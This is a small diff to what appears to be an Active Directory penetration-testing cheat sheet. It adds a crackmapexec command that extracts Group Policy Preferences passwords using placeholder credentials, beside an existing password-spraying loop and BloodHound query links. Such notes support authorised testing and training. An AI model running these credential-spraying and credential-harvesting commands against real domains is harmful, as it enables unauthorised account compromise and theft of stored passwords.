@@ -12,6 +12,11 @@ for word in $(cat users.txt); do crackmapexec smb 10.10.0.10 -u $word -p $word -
 
 # Authenticated enumeration
 
+### Checking GPP passwords
+```
+crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M gpp_password
+```
+
 ### Expanding BloodHound
 - https://github.com/hausec/Bloodhound-Custom-Queries
 - https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
